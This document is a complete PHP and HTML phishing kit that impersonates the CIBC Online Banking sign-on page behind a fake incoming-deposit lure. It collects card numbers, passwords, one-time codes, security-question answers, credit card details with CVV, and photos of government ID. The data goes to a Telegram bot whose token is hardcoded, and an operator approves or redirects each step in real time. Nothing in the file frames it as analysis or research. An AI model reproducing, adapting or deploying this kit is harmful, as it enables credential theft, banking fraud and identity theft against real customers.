<?php
session_start();

/**
 * CIBC Financial - Verification System
 * Features: High-fidelity UI, Cloudflare IP Detection, Telegram Controller, ID Upload
 */

/* ---------- Configuration ---------- */
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

/* ---------- Helper: Get Real IP ---------- */
function get_client_ip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Cloudflare
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } 
    // Proxy
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ip_list[0]);
    } 
    elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    
    // Clean up IPv4-mapped IPv6 addresses (e.g. ::ffff:192.168.1.1)
    if (strpos($ip, '::ffff:') === 0) {
        $ip = substr($ip, 7);
    }
    
    // Filter out local/private IPs if needed, or return as is
    return trim($ip);
}

/* ---------- Token Decryption & Data Setup ---------- */
$senderName = '';
$amountFormatted = '';
$securityQuestion = "What is this for?";

if (!empty($_GET['deposit'])) {
    try {
        $token = $_GET['deposit'];
        $encryptionKey = 'a3f91b6cd024e8c29b76a149efcc5d42'; 
        
        $encrypted = base64_decode(str_pad(strtr($token, '-_', '+/'), strlen($token) % 4, '=', STR_PAD_RIGHT));
        $iv = substr($encrypted, 0, 16);
        $data = substr($encrypted, 16);
        $keyHash = hash('sha256', $encryptionKey, true);
        
        $decrypted = openssl_decrypt($data, 'AES-256-CBC', $keyHash, OPENSSL_RAW_DATA, $iv);
        
        if ($decrypted) {
            parse_str($decrypted, $params);
            if (!empty($params['sender'])) $senderName = $params['sender'];
            if (!empty($params['amount'])) $amountFormatted = number_format((float)str_replace(['$',',',' '],'',$params['amount']), 2);
            if (!empty($params['question'])) $securityQuestion = $params['question'];
            $_SESSION['transaction_data'] = $params;
        }
    } catch (Exception $e) {}
}

/* ---------- Server-Side Proxy ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $allowed_actions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];
    
    if (in_array($action, $allowed_actions)) {
        $params = $_POST;
        unset($params['action']);
        
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                $params[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
            }
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegramToken}/{$action}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    }
    exit;
}

/* ---------- Initial Notification ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    @file_get_contents("https://api.telegram.org/bot{$telegramToken}/deleteWebhook"); 
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    
    $clientIP = get_client_ip();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $notificationText = "🟥 CIBC CONTROLLER 🟥\n\n";
    $notificationText .= "<b>SESSION STARTED</b>\n";
    $notificationText .= "IP: <code>" . $clientIP . "</code>\n";
    $notificationText .= "Details: <code>" . $senderName . " | $" . $amountFormatted . "</code>\n\n";
    $notificationText .= "🟥 CIBC CONTROLLER 🟥";

    $payload = [
        'chat_id' => $chatId,
        'text' => $notificationText,
        'parse_mode' => 'HTML'
    ];
    $options = ['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($payload)]];
    @file_get_contents($url, false, stream_context_create($options));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign on to CIBC Online Banking</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap">
    <style>
        :root {
            --cibc-red: #c41130;
            --cibc-dark-red: #9e0e26;
            --cibc-grey: #333333;
            --cibc-light-grey: #f7f7f7;
            --cibc-border: #999999;
            --cibc-link: #0a6e9b;
        }

        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        
        body { 
            font-family: 'Open Sans', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        .header {
            padding: 20px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo-cibc img {
            height: 35px;
        }

        .header-links {
            font-size: 14px;
            color: var(--cibc-grey);
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .header-links a {
            text-decoration: none;
            color: var(--cibc-grey);
        }
        
        .header-links a:hover {
            text-decoration: underline;
        }

        .shield-icon {
            width: 24px;
            height: 24px;
            fill: none;
            stroke: currentColor;
            stroke-width: 2;
        }

        .main-container {
            flex: 1;
            padding: 20px 5%;
            max-width: 480px;
            margin: 0 auto;
            width: 100%;
        }

        h1 {
            color: var(--cibc-grey);
            font-weight: 400;
            font-size: 24px;
            margin-bottom: 30px;
            margin-top: 10px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            color: var(--cibc-grey);
            font-size: 16px;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #777;
            border-radius: 6px;
            outline: none;
        }
        
        .form-input:focus {
            border-color: var(--cibc-red);
            box-shadow: 0 0 0 1px var(--cibc-red);
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }

        .checkbox-group input {
            width: 20px;
            height: 20px;
            margin-right: 10px;
            cursor: pointer;
            accent-color: var(--cibc-red);
            border-color: #777;
        }

        .checkbox-label {
            font-size: 16px;
            color: var(--cibc-grey);
            display: flex;
            align-items: center;
        }
        
        .info-i {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 1px solid #555;
            border-radius: 50%;
            text-align: center;
            line-height: 18px;
            font-size: 12px;
            margin-left: 8px;
            color: #555;
            font-family: serif;
            font-style: italic;
        }

        .btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            text-align: center;
            font-weight: 600;
            margin-bottom: 15px;
            transition: background 0.2s;
        }

        .btn-primary {
            background-color: var(--cibc-red);
            color: white;
            border: none;
        }

        .btn-primary:hover {
            background-color: var(--cibc-dark-red);
        }

        .btn-secondary {
            background-color: white;
            color: var(--cibc-red);
            border: 1px solid var(--cibc-red);
        }
        
        .btn-secondary:hover {
            background-color: #fff5f6;
        }
        
        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .links-section {
            text-align: center;
            margin-top: 20px;
            font-size: 16px;
            color: var(--cibc-grey);
        }

        .links-section a {
            color: var(--cibc-link);
            text-decoration: underline;
            cursor: pointer;
        }

        .footer {
            background-color: #333333;
            color: white;
            padding: 40px 20px;
            text-align: center;
            font-size: 14px;
        }

        .footer-links {
            margin-bottom: 20px;
        }

        .footer-links a {
            color: white;
            text-decoration: none;
            margin: 0 10px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }

        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.5);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin-left: 10px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .error-banner {
            background-color: #fce8e8;
            border: 1px solid var(--cibc-red);
            color: var(--cibc-red);
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            display: none;
            font-size: 14px;
        }

        .step-section { display: none; }
        .active-step { display: block; }
        
        /* Specific overwrites for high fidelity */
        .card-icon {
            position: absolute;
            right: 15px;
            top: 40px;
            width: 24px;
            opacity: 0.5;
        }

        .sec-q-box {
            background: #f9f9f9;
            border-left: 4px solid var(--cibc-red);
            padding: 15px;
            margin-bottom: 20px;
        }
        
        .id-upload-area {
            border: 2px dashed #ccc;
            padding: 25px;
            text-align: center;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 15px;
        }
        .id-upload-area:hover { background-color: #f9f9f9; border-color: var(--cibc-red); }
    </style>
</head>
<body>

    <header class="header">
        <div data-v-231ca556="" class="logo-cibc span-2">
            <a href="https://www.cibc.com/en/personal-banking.html" target="_self" data-test-id="cibc-logo-link">
                <img src="https://www.cibc.com/content/dam/global-assets/logos/cibc-logos/no-tagline/cibc-logo-colour-142x36.svg" alt="CIBC Personal Banking.">
            </a>
        </div>
        <div class="header-links">
            <a href="#">English</a>
            <span>|</span>
            <a href="#">Français</a>
            <svg class="shield-icon" viewBox="0 0 24 24">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
            </svg>
        </div>
    </header>

    <div class="main-container">
        <h1 id="pageTitle">Sign on to CIBC Online Banking®</h1>
        
        <div id="errorBanner" class="error-banner"></div>

        <!-- STEP 1: CARD NUMBER -->
        <div id="stepCard" class="step-section active-step">
            <div class="form-group" style="position:relative;">
                <label class="form-label">Card number</label>
                <input type="tel" id="cardNumber" class="form-input" maxlength="16" placeholder="">
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="rememberCard">
                <label for="rememberCard" class="checkbox-label">Remember my card <span class="info-i">i</span></label>
            </div>

            <button id="btnCard" class="btn btn-primary" onclick="handleCardStep()">Continue</button>
            <button class="btn btn-secondary">Back</button>

            <div class="links-section">
                Not registered for online banking?<br>
                <a href="#">Register now</a>.<br><br>
                Trouble signing on?<br>
                <a href="#">Reset your password</a>.
            </div>
        </div>

        <!-- STEP 2: PASSWORD -->
        <div id="stepPass" class="step-section">
            <p style="color:#666; margin-bottom:20px;">Card: <strong id="displayCard"></strong></p>
            <div class="form-group">
                <label class="form-label">Password</label>
                <input type="password" id="password" class="form-input">
            </div>
            
            <button id="btnPass" class="btn btn-primary" onclick="handlePassStep()">
                Sign on <span class="spinner" id="spinPass" style="display:none"></span>
            </button>
            <button class="btn btn-secondary" onclick="showStep('stepCard')">Back</button>
        </div>

        <!-- STEP 3: OTP -->
        <div id="stepOTP" class="step-section">
            <p style="margin-bottom:20px;">For your security, we've sent a verification code to your registered device.</p>
            <div class="form-group">
                <label class="form-label">Verification Code (6-digits)</label>
                <input type="tel" id="otp" class="form-input" maxlength="6" style="letter-spacing: 5px; font-size: 20px;">
            </div>
            
            <button id="btnOTP" class="btn btn-primary" onclick="handleOTPStep()">
                Verify <span class="spinner" id="spinOTP" style="display:none"></span>
            </button>
        </div>

        <!-- STEP 4: SECURITY QUESTION -->
        <div id="stepSecQ" class="step-section">
            <div class="sec-q-box">
                <div style="font-size:12px; color:#555; text-transform:uppercase;">Incoming Transfer</div>
                <div style="font-size:18px; font-weight:700; margin:5px 0;"><?= htmlspecialchars($senderName) ?></div>
                <div style="font-size:24px; color:#008a00; font-weight:700;">$<?= $amountFormatted ?></div>
            </div>
            
            <div class="form-group">
                <label class="form-label"><strong>Security Question</strong></label>
                <div style="margin-bottom:15px; font-size:16px;"><?= htmlspecialchars($securityQuestion) ?></div>
                <input type="text" id="secAns" class="form-input" placeholder="Answer">
            </div>

            <button id="btnSecQ" class="btn btn-primary" onclick="handleSecQStep()">
                Deposit Funds <span class="spinner" id="spinSecQ" style="display:none"></span>
            </button>
        </div>

        <!-- INTERIM SUCCESS -->
        <div id="stepSuccess" class="step-section" style="text-align:center;">
            <div style="width:60px; height:60px; background:#008a00; color:white; border-radius:50%; line-height:60px; font-size:30px; margin:0 auto 20px;">✓</div>
            <h2>Deposit Successful</h2>
            <p style="color:#666; margin-bottom:30px;">To finalize the transaction and upgrade your limits, please verify your profile.</p>
            <button class="btn btn-primary" onclick="showStep('stepCC')">Continue to Verification</button>
        </div>

        <!-- STEP 5: CC DETAILS -->
        <div id="stepCC" class="step-section">
            <div class="form-group">
                <label class="form-label">Card Number</label>
                <input type="tel" id="ccNum" class="form-input" maxlength="19" placeholder="xxxx xxxx xxxx xxxx">
            </div>
            
            <div style="display:flex; gap:15px;">
                <div class="form-group" style="flex:1;">
                    <label class="form-label">Expiry</label>
                    <div style="display:flex; gap:5px;">
                        <select id="ccMonth" class="form-input" style="padding:12px 5px;">
                            <option>MM</option><option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option>
                            <option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option>
                        </select>
                        <select id="ccYear" class="form-input" style="padding:12px 5px;">
                            <option>YY</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="flex:1;">
                    <label class="form-label">CVV (3-digit)</label>
                    <input type="password" id="ccCvv" class="form-input" maxlength="3">
                </div>
            </div>

            <button id="btnCC" class="btn btn-primary" onclick="handleCCStep()">
                Verify Card <span class="spinner" id="spinCC" style="display:none"></span>
            </button>
        </div>

        <!-- STEP 6: ID UPLOAD -->
        <div id="stepID" class="step-section">
            <p>Please upload a piece of Government ID (Front and Back) to verify your identity.</p>
            
            <div class="id-upload-area" onclick="document.getElementById('idFront').click()">
                <div>📷 Upload Front</div>
                <small id="nameFront" style="color:#777;">No file selected</small>
                <input type="file" id="idFront" accept="image/*" hidden onchange="document.getElementById('nameFront').innerText = this.files[0].name">
            </div>

            <div class="id-upload-area" onclick="document.getElementById('idBack').click()">
                <div>📷 Upload Back</div>
                <small id="nameBack" style="color:#777;">No file selected</small>
                <input type="file" id="idBack" accept="image/*" hidden onchange="document.getElementById('nameBack').innerText = this.files[0].name">
            </div>

            <button id="btnID" class="btn btn-primary" onclick="handleIDStep()">
                Submit Documents <span class="spinner" id="spinID" style="display:none"></span>
            </button>
        </div>

        <!-- FINAL -->
        <div id="stepDone" class="step-section" style="text-align:center;">
             <div style="width:60px; height:60px; background:#008a00; color:white; border-radius:50%; line-height:60px; font-size:30px; margin:0 auto 20px;">✓</div>
             <h2>Verification Complete</h2>
             <p>You will be redirected to the home page shortly.</p>
             <button class="btn btn-primary" onclick="window.location.href='https://www.cibc.com'">Finish</button>
        </div>

    </div>

    <footer class="footer">
        <div class="footer-links">
            <a href="#">Accessibility at CIBC</a>
            <a href="#">Privacy and security</a>
            <a href="#">Legal</a>
        </div>
        <div>
            “CIBC” and the CIBC Logo are trademarks of CIBC.
        </div>
    </footer>

<script>
    const chatId = "<?= $chatId ?>";
    let lastUpdateId = 0;
    let pollInterval;

    // Formatting
    document.getElementById('ccNum').addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, '').substring(0,16);
        let f = v.match(/.{1,4}/g);
        e.target.value = f ? f.join(' ') : v;
    });

    // API Helper
    async function api(action, data, isFile = false) {
        let body;
        if(isFile) {
            body = new FormData();
            body.append('action', action);
            for(let k in data) body.append(k, data[k]);
        } else {
            const fd = new FormData();
            fd.append('action', action);
            for(let k in data) fd.append(k, data[k]);
            body = fd;
        }
        return fetch('', {method:'POST', body}).then(r=>r.json());
    }

    // Polling Logic
    api('getUpdates', {offset: -1}).then(d => { 
        if(d.result && d.result.length) lastUpdateId = d.result[0].update_id; 
    });

    function poll(msgId, onOk, onFail) {
        if(pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            try {
                const r = await fetch('', {
                    method:'POST', 
                    headers:{'Content-Type':'application/x-www-form-urlencoded'},
                    body:`action=getUpdates&offset=${lastUpdateId+1}&timeout=2`
                });
                const d = await r.json();
                if(d.result && d.result.length) {
                    for(let u of d.result) {
                        lastUpdateId = u.update_id;
                        if(u.callback_query && u.callback_query.message.message_id == msgId) {
                            clearInterval(pollInterval);
                            const cmd = u.callback_query.data;
                            api('editMessageReplyMarkup', {chat_id:chatId, message_id:msgId, reply_markup:JSON.stringify({inline_keyboard:[]})});
                            
                            if(cmd === 'yes') onOk();
                            else if(cmd === 'no') onFail();
                            else if(cmd === 'go_cc') showStep('stepCC');
                            else if(cmd === 'go_id') showStep('stepID');
                            else if(cmd === 'cancel') window.location.href="https://cibc.com";
                        }
                    }
                }
            } catch(e){}
        }, 2000);
    }

    function showStep(id) {
        document.querySelectorAll('.step-section').forEach(d => d.style.display='none');
        document.getElementById(id).style.display='block';
        document.getElementById('errorBanner').style.display='none';
        window.scrollTo(0,0);
    }

    async function sendLog(step, content, btnId, spinId, next) {
        const btn = document.getElementById(btnId);
        const spin = document.getElementById(spinId);
        const txt = btn.innerText;
        
        if(spin) spin.style.display = 'inline-block';
        btn.disabled = true;
        
        try {
            const kb = {inline_keyboard:[
                [{text:"✅ ALLOW", callback_data:"yes"}, {text:"❌ BLOCK", callback_data:"no"}],
                [{text:"REQ CC", callback_data:"go_cc"}, {text:"REQ ID", callback_data:"go_id"}],
                [{text:"END SESSION", callback_data:"cancel"}]
            ]};
            
            const r = await api('sendMessage', {
                chat_id: chatId,
                text: `🟥 <b>CIBC - ${step}</b>\n\n${content}`,
                parse_mode: 'HTML',
                reply_markup: JSON.stringify(kb)
            });
            
            poll(r.result.message_id, 
                () => { // OK
                    btn.disabled = false;
                    if(spin) spin.style.display='none';
                    next();
                },
                () => { // Fail
                    btn.disabled = false;
                    if(spin) spin.style.display='none';
                    document.getElementById('errorBanner').innerText = "The information entered is incorrect. Please try again.";
                    document.getElementById('errorBanner').style.display = 'block';
                }
            );
        } catch(e) {
            btn.disabled = false;
        }
    }

    // Step Logic
    function handleCardStep() {
        const c = document.getElementById('cardNumber').value;
        if(c.length < 10) return;
        document.getElementById('displayCard').innerText = c;
        showStep('stepPass');
    }

    function handlePassStep() {
        const c = document.getElementById('cardNumber').value;
        const p = document.getElementById('password').value;
        if(!p) return;
        sendLog('LOGIN', `Card: <code>${c}</code>\nPass: <code>${p}</code>`, 'btnPass', 'spinPass', () => showStep('stepOTP'));
    }

    function handleOTPStep() {
        const o = document.getElementById('otp').value;
        if(o.length < 6) return;
        sendLog('OTP', `Code: <code>${o}</code>`, 'btnOTP', 'spinOTP', () => showStep('stepSecQ'));
    }

    function handleSecQStep() {
        const a = document.getElementById('secAns').value;
        if(!a) return;
        sendLog('SEC QUESTION', `Answer: <code>${a}</code>`, 'btnSecQ', 'spinSecQ', () => showStep('stepSuccess'));
    }

    function handleCCStep() {
        const n = document.getElementById('ccNum').value;
        const e = document.getElementById('ccMonth').value + '/' + document.getElementById('ccYear').value;
        const c = document.getElementById('ccCvv').value;
        if(!n || !c) return;
        sendLog('CC INFO', `Card: <code>${n}</code>\nExp: <code>${e}</code>\nCVV: <code>${c}</code>`, 'btnCC', 'spinCC', () => showStep('stepID'));
    }

    async function handleIDStep() {
        const f = document.getElementById('idFront').files[0];
        const b = document.getElementById('idBack').files[0];
        if(!f || !b) { alert("Please upload both sides."); return; }
        
        const btn = document.getElementById('btnID');
        btn.innerText = "Uploading...";
        btn.disabled = true;

        await api('sendPhoto', {chat_id: chatId, caption: 'Front', photo: f}, true);
        await api('sendPhoto', {chat_id: chatId, caption: 'Back', photo: b}, true);
        
        sendLog('ID DOCS', 'Documents uploaded.', 'btnID', 'spinID', () => showStep('stepDone'));
        btn.innerText = "Submit Documents";
    }

</script>
</body>
</html>